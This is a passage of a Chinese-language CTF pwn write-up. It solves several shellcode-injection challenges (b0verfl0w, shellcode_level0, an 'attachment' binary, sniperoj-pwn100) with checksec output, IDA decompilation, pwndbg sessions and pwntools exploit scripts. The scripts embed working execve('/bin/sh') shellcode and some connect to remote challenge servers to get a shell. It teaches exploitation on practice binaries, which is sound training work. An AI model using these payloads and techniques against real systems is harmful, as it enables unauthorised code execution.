class="code"><pre><span class="line">$ checksec b0verfl0w</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>无任何保护开启,进入 IDA 中进行分析</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+18h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在栈溢出，但溢出长度较短，只有0x32-0x20-4 &#x3D; 14个字节，很难布置一些较好的 ROP链。由于程序本身并没有开启 NX 保护，所以我们可以在栈上布置 shellcode 并执行。利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。那下面就是找控制程序跳转到 esp 处的 gadgets 了。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary b0verfl0w --only jmp</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080483ab : jmp 0x8048390</span><br><span class="line">0x080484f2 : jmp 0x8048470</span><br><span class="line">0x08048611 : jmp 0x8048620</span><br><span class="line">0x0804855d : jmp dword ptr [ecx + 0x804a040]</span><br><span class="line">0x08048550 : jmp dword ptr [ecx + 0x804a060]</span><br><span class="line">0x0804876f : jmp dword ptr [ecx]</span><br><span class="line">0x08048504 : jmp esp</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br><span class="line">或者</span><br><span class="line">$ ROPgadget --binary b0verfl0w | grep <span class="string">&quot;jmp esp&quot;</span></span><br><span class="line">0x08048502 : and al, 0xc3 ; jmp esp</span><br><span class="line">0x08048501 : <span class="keyword">in</span> al, dx ; and al, 0xc3 ; jmp esp</span><br><span class="line">0x080484ff : <span class="keyword">in</span> eax, 0x83 ; <span class="keyword">in</span> al, dx ; and al, 0xc3 ; jmp esp</span><br><span class="line">0x08048504 : jmp esp</span><br></pre></td></tr></table></figure><p>因为长度不够，所以我们可以想办法利用上方用来填充的0x20个字节，在0x20个字节中写入一个 getshell 的 shellcode，在 jmp esp 后写入 sub esp,0x28;jmp<br>esp;即可将 esp 抬至上方的 buf 处继续执行 shellcode。<br>由于长度较短，不能够直接使用shellcraft.sh()，在 exploit-db中查找一个较短的shellcode使用即可<a href="https://www.exploit-db.com/shellcodes/47513">https://www.exploit-db.com/shellcodes/47513</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /CTF/b0verfl0w</span><br><span class="line">warning: Error disabling address space randomization: Operation not permitted</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">Welcome to X-CTF 2016!</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line">What<span class="string">&#x27;s your name?</span></span><br><span class="line"><span class="string">^C</span></span><br><span class="line"><span class="string">Program received signal SIGINT, Interrupt.</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">pwndbg&gt; cyclic 100</span></span><br><span class="line"><span class="string">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span></span><br><span class="line"><span class="string">pwndbg&gt; c</span></span><br><span class="line"><span class="string">Continuing.</span></span><br><span class="line"><span class="string">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span></span><br><span class="line"><span class="string">Hello aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam.</span></span><br><span class="line"><span class="string">Program received signal SIGSEGV, Segmentation fault.</span></span><br><span class="line"><span class="string">0x6161616a in ?? ()</span></span><br><span class="line"><span class="string">Warning: Avoided exploring possible address 0xff315755.</span></span><br><span class="line"><span class="string">You can explicitly explore it with `vmmap-explore 0xff315000`</span></span><br><span class="line"><span class="string">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span></span><br><span class="line"><span class="string">───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────</span></span><br><span class="line"><span class="string">*EAX  1</span></span><br><span class="line"><span class="string">*EBX  0xefb50e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* &#x27;</span>,\r#<span class="string">&#x27; */</span></span><br><span class="line"><span class="string">*ECX  0</span></span><br><span class="line"><span class="string">*EDX  0xefb528a0 (_IO_stdfile_1_lock) ◂— 0</span></span><br><span class="line"><span class="string">*EDI  0xefba2b60 (_rtld_global_ro) ◂— 0</span></span><br><span class="line"><span class="string">*ESI  0x80485b0 (__libc_csu_init) —▸ 0xff315755 ◂— 0xff315755</span></span><br><span class="line"><span class="string">*EBP  0x61616169 (&#x27;</span>iaaa<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">*ESP  0xff9b1a90 ◂— &#x27;</span>kaaalaaam<span class="string">&#x27;</span></span><br><span class="line"><span class="string">*EIP  0x6161616a (&#x27;</span>jaaa<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">pwndbg&gt; cyclic -l jaaa</span></span><br><span class="line"><span class="string">Finding cyclic pattern of 4 bytes: b&#x27;</span>jaaa<span class="string">&#x27; (hex: 0x6a616161)</span></span><br><span class="line"><span class="string">Found at offset 36</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">+---------------------+  ← buf起始地址（假设为0xbffff700）</span><br><span class="line">|   shellcode (25B)   |</span><br><span class="line">+---------------------+</span><br><span class="line">|  填充数据 (7B)       |</span><br><span class="line">+---------------------+</span><br><span class="line">|  覆盖ebp (4B)        |  ← 这就“偏移量36”中的4字节</span><br><span class="line">+---------------------+</span><br><span class="line">|  覆盖返回地址 (4B)    |  ← jmp_esp地址</span><br><span class="line">+---------------------+</span><br><span class="line">|sub esp,0x28;jmp esp |</span><br><span class="line">+---------------------+  ← 执行ret时的esp位置</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure><p><strong>esp 调整计算</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp调整量 = 执行jmp esp时的esp地址 - shellcode起始地址</span><br></pre></td></tr></table></figure><p>假设：</p><ul><li>shellcode 起始地址 &#x3D; 0xbffff700</li><li>执行 jmp esp 时的 esp 地址 &#x3D; 0xbffff6d8</li></ul><p>则调整量 &#x3D; 0xbffff700 - 0xbffff6d8 &#x3D; <strong>0x28</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(<span class="string">&#x27;./b0verfl0w&#x27;</span>)</span><br><span class="line">shellcode_x86=b<span class="string">&quot;\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80&quot;</span> <span class="comment">#25字节</span></span><br><span class="line">padding_len = 0x20 - len(shellcode_x86)  <span class="comment">#计算buf中剩余空间32 - 25 = 7字节</span></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)</span><br><span class="line">jmp_esp = 0x08048504</span><br><span class="line">payload = shellcode_x86 + b<span class="string">&#x27;b&#x27;</span> * padding_len + b<span class="string">&#x27;bbbb&#x27;</span> + p32(jmp_esp) +sub_esp_jmp#25字节shellcode+7字节填充+4字节覆盖ebp（关键！）+4字节覆盖返回地址+调整esp到shellcode</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h2><blockquote><p>点击下载: <a href="../../../../../../../challeges/shellcode_level0">shellcode_level0</a></p></blockquote><p>Checksec 查看保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec shellcode_level0</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  SHSTK:      Enabled</span><br><span class="line">  IBT:        Enabled</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>开启了RELRO，这使得整个重定位表都是可读的，同时还开启了NX保护，使得数据段不可执行，文件为64位的可执行文件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == (<span class="type">void</span> *)<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input shellcode: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过检查未发现后门函数，且read函数存在栈溢出漏洞，所以此题的思路为构造shellcode,将shellcode写入可以控制的执行流内，并将函数的返回地址修改为shellcode所在的地址，从而获取shell。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7ffe7cd48cb8 —▸ 0x5885aecdf2ea (main+156) ◂— mov eax, 0</span><br><span class="line">01:0008│-010 0x7ffe7cd48cc0 —▸ 0x787fa03bc000 ◂— <span class="string">&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n&#x27;</span></span><br><span class="line">02:0010│-008 0x7ffe7cd48cc8 —▸ 0x787fa03bc000 ◂— <span class="string">&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n&#x27;</span></span><br><span class="line">03:0018│ rbp 0x7ffe7cd48cd0 —▸ 0x7ffe7cd48d70 —▸ 0x7ffe7cd48dd0 ◂— 0</span><br><span class="line">04:0020│+008 0x7ffe7cd48cd8 —▸ 0x787fa01ca1ca (__libc_start_call_main+122) ◂— mov edi, eax</span><br><span class="line">05:0028│+010 0x7ffe7cd48ce0 —▸ 0x7ffe7cd48d20 —▸ 0x5885aece1d98 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5885aecdf1a0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">06:0030│+018 0x7ffe7cd48ce8 —▸ 0x7ffe7cd48df8 —▸ 0x7ffe7cd4a6f4 ◂— <span class="string">&#x27;/CTF/shellcode_level0&#x27;</span></span><br><span class="line">07:0038│+020 0x7ffe7cd48cf0 ◂— 0x1aecde040</span><br></pre></td></tr></table></figure><p>溢出长度为0x18</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./shellcode_level0&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20145</span>)</span><br><span class="line">shellcode=asm(shellcraft.amd64.sh())</span><br><span class="line">buf_addr=<span class="number">0x10</span></span><br><span class="line">payload=shellcode.ljust(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(buf_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./shellcode_level0&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;challenge.basectf.fun&#x27;,28688)</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="例4"><a href="#例4" class="headerlink" title="例4"></a>例4</h2><blockquote><p>点击下载: <a href="../../../../../../../challeges/attachment">attachment</a></p></blockquote><p>Checksec 查看保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x attachment</span><br><span class="line">$ checksec attachment</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      Canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  SHSTK:      Enabled</span><br><span class="line">  IBT:        Enabled</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>发现elf开启了pie保护，并且开启了canary保护，这使得使用栈溢出漏洞进行攻击变得难以执行。但是，根据题目提示，本题实质上还是要写入shellcode，但是具体往哪里写呢？又怎么写入呢？</p><p>还是利用ida进行反编译，观察一下程序的逻辑。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span>&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == (<span class="type">void</span> *)<span class="number">-1LL</span> )&#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">2uLL</span>);</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, <span class="type">void</span> *, __int64))buf)(<span class="number">0LL</span>, buf, <span class="number">1280LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( munmap(buf, <span class="number">0x1000u</span>LL) == <span class="number">-1</span> )&#123;</span><br><span class="line">      perror(<span class="string">&quot;munmap failed&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ida里我们发现，buf变量是一段可读可写可执行的内存空间，并且，如果mmap函数开辟空间正确，首先会向buf里读入两个字节，然后会把buf空间里的内容当作函数，进行执行。那么我们自然可以想到，如果我们向buf里写入shellcode，那shellcode就会被执行，我们就可以成功获取shell。但是因为程序开启了pie保护，所以我们直接找到buf的地址向buf里写入shellcode的思路显然是不可行的，那具体怎么写入呢？</p><p>通过检查汇编代码，可以发现，在read(0,buf,2ull)之后，有向寄存器赋值的汇编代码，并且会调用rcx寄存器里的内容的操作，那我们就自然可以想到，向rcx寄存器里写入一个函数，且该函数的功能可以实现向buf里读取内容的操作。所以我们可以向rcx寄存器里写入syscall，那么syscall第一个参数是rax寄存器里的值0，所以此时看似调用的是syscall，实则调用的是read函数，并且，rax里是0，rsi的值是buf，rdx的值是500h，也就是调用read(0,buf,0x500)。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000122A loc_122A:                               ; CODE XREF: main+49↑j</span><br><span class="line">.text:000000000000122A                 mov     rax, [rbp+buf]</span><br><span class="line">.text:000000000000122E                 mov     edx, 2          ; nbytes</span><br><span class="line">.text:0000000000001233                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000001236                 mov     edi, 0          ; fd</span><br><span class="line">.text:000000000000123B                 call    _read</span><br><span class="line">.text:0000000000001240                 mov     rsi, [rbp+buf]</span><br><span class="line">.text:0000000000001244                 mov     rcx, rsi</span><br><span class="line">.text:0000000000001247                 mov     rdx, 500h</span><br><span class="line">.text:000000000000124E                 mov     rax, 0</span><br><span class="line">.text:0000000000001255                 call    rcx</span><br><span class="line">.text:0000000000001257                 mov     rax, [rbp+buf]</span><br><span class="line">.text:000000000000125B                 mov     esi, 1000h      ; len</span><br><span class="line">.text:0000000000001260                 mov     rdi, rax        ; addr</span><br><span class="line">.text:0000000000001263                 call    _munmap</span><br><span class="line">.text:0000000000001268                 cmp     eax, 0FFFFFFFFh</span><br><span class="line">.text:000000000000126B                 jnz     short loc_1283</span><br><span class="line">.text:000000000000126D                 lea     rax, aMunmapFailed ; &quot;munmap failed&quot;</span><br><span class="line">.text:0000000000001274                 mov     rdi, rax        ; s</span><br><span class="line">.text:0000000000001277                 call    _perror</span><br><span class="line">.text:000000000000127C                 mov     eax, 1</span><br><span class="line">.text:0000000000001281                 jmp     short loc_1288</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./attachment&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20160</span>)</span><br><span class="line">p.send(asm(<span class="string">&#x27;syscall&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;aa&#x27;</span>+asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要写有限个字节内的shellcode，需要观察当前寄存器内的值</span><br><span class="line">拿本题为例，在调用指向buf的函数指针的函数时，此时关键寄存器的情况如下</span><br><span class="line">- rax=0</span><br><span class="line">- rdi=0</span><br><span class="line">- rsi=[buf]</span><br><span class="line">- rdx=0x500</span><br><span class="line">所以我们可以再次执行sys_read。此时写入的两字节为</span><br><span class="line">payload = &#x27;\x0f\x05&#x27; # 即syscall所代表的汇编</span><br><span class="line">完整exp如下</span><br><span class="line">from pwn import *</span><br><span class="line"># p = process(&#x27;./attachment&#x27;)</span><br><span class="line">p = remote(&#x27;challenge.basectf.fun&#x27;, 27606)</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line"></span><br><span class="line">shellcode = asm(&quot;syscall&quot;) # 即&#x27;\x0f\x05&#x27;</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">shellcode = b&#x27;\x90&#x27;*2 + asm(shellcraft.sh()) # &#x27;\x90&#x27;为nop的汇编，覆盖掉之前的syscall</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="例五"><a href="#例五" class="headerlink" title="例五"></a>例五</h2><blockquote><p>点击下载: <a href="../../../../../../../challeges/sniperoj-pwn100-shellcode-x86-64">sniperoj-pwn100-shellcode-x86-64</a></p></blockquote><p>Checksec 查看保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec sniperoj-pwn100-shellcode-x86-64</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>64位，没有开启堆栈不可执行的保护，查看反汇编</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Sniperoj!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Do your kown what is it : [%p] ?\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now give me your answer : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以覆盖的空间大小为0x40，buf大小为0x10，没有发现system函数与“&#x2F;bin&#x2F;sh”字符串，因此我们可以采用直接写入shellcode的方法。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python3</span><br><span class="line">Python <span class="number">3.12</span><span class="number">.3</span> (main, Feb  <span class="number">4</span> <span class="number">2025</span>, <span class="number">14</span>:<span class="number">48</span>:<span class="number">35</span>) [GCC <span class="number">13.3</span><span class="number">.0</span>] on linux</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>shell=asm(shellcraft.sh())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(shell)</span><br><span class="line"><span class="number">44</span></span><br></pre></td></tr></table></figure><p>平常所用的shellcode长度太长，需要更换短一点的shellcode。</p><p>下面是两个可以去搜寻shllcode的网址：</p><p><a href="https://www.exploit-db.com/shellcodes">https://www.exploit-db.com/shellcodes</a><br><a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a></p><p><code>shellcode=”\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05”</code></p><p>接下来应该考虑的是要把shellcode放在那个位置，如果按劫持栈指针的方法，把因为空间不大，可以把shellcoe放在最开头，然后控制程序流跳转执行shellcode，但是本题不可以，原因如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000007D0 ; int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00000000000007D0                 public main</span><br><span class="line">.text:00000000000007D0 main            proc near               ; DATA XREF: _start+1D↑o</span><br><span class="line">.text:00000000000007D0</span><br><span class="line">.text:00000000000007D0 buf             = qword ptr -10h</span><br><span class="line">.text:00000000000007D0 var_8           = qword ptr -8</span><br><span class="line">.text:00000000000007D0</span><br><span class="line">.text:00000000000007D0 ; __unwind &#123;</span><br><span class="line">.text:00000000000007D0                 push    rbp</span><br><span class="line">.text:00000000000007D1                 mov     rbp, rsp</span><br><span class="line">.text:00000000000007D4                 sub     rsp, 10h</span><br><span class="line">.text:00000000000007D8                 mov     [rbp+buf], 0</span><br><span class="line">.text:00000000000007E0                 mov     [rbp+var_8], 0</span><br><span class="line">.text:00000000000007E8                 mov     rax, cs:__bss_start</span><br><span class="line">.text:00000000000007EF                 mov     ecx, 0          ; n</span><br><span class="line">.text:00000000000007F4                 mov     edx, 1          ; modes</span><br><span class="line">.text:00000000000007F9                 mov     esi, 0          ; buf</span><br><span class="line">.text:00000000000007FE                 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000000801                 call    _setvbuf</span><br><span class="line">.text:0000000000000806                 lea     rdi, s          ; &quot;Welcome to Sniperoj!&quot;</span><br><span class="line">.text:000000000000080D                 call    _puts</span><br><span class="line">.text:0000000000000812                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000000816                 mov     rsi, rax</span><br><span class="line">.text:0000000000000819                 lea     rdi, format     ; &quot;Do your kown what is it : [%p] ?\n&quot;</span><br><span class="line">.text:0000000000000820                 mov     eax, 0</span><br><span class="line">.text:0000000000000825                 call    _printf</span><br><span class="line">.text:000000000000082A                 lea     rdi, aNowGiveMeYourA ; &quot;Now give me your answer : &quot;</span><br><span class="line">.text:0000000000000831                 call    _puts</span><br><span class="line">.text:0000000000000836                 lea     rax, [rbp+buf]</span><br><span class="line">.text:000000000000083A                 mov     edx, 40h ; &#x27;@&#x27;  ; nbytes</span><br><span class="line">.text:000000000000083F                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000000842                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000000847                 call    _read</span><br><span class="line">.text:000000000000084C                 mov     eax, 0</span><br><span class="line">.text:0000000000000851                 leave</span><br><span class="line">.text:0000000000000852                 retn</span><br></pre></td></tr></table></figure><p><code>leave的作用相当于**MOV RSP,RBP；POP RBP。**</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python3</span><br><span class="line">Python <span class="number">3.12</span><span class="number">.3</span> (main, Feb  <span class="number">4</span> <span class="number">2025</span>, <span class="number">14</span>:<span class="number">48</span>:<span class="number">35</span>) [GCC <span class="number">13.3</span><span class="number">.0</span>] on linux</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcode=<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(disasm(shellcode,arch=<span class="string">&#x27;amd64&#x27;</span>))</span><br><span class="line">   <span class="number">0</span>:   <span class="number">48</span> <span class="number">31</span> f6                xor    rsi, rsi</span><br><span class="line">   <span class="number">3</span>:   <span class="number">56</span>                      push   rsi</span><br><span class="line">   <span class="number">4</span>:   <span class="number">48</span> bf 2f <span class="number">62</span> <span class="number">69</span> 6e 2f 2f <span class="number">73</span> <span class="number">68</span>   movabs rdi, <span class="number">0x68732f2f6e69622f</span></span><br><span class="line">   e:   <span class="number">57</span>                      push   rdi</span><br><span class="line">   f:   <span class="number">54</span>                      push   rsp</span><br><span class="line">  <span class="number">10</span>:   5f                      pop    rdi</span><br><span class="line">  <span class="number">11</span>:   6a 3b                   push   <span class="number">0x3b</span></span><br><span class="line">  <span class="number">13</span>:   <span class="number">58</span>                      pop    rax</span><br><span class="line">  <span class="number">14</span>:   <span 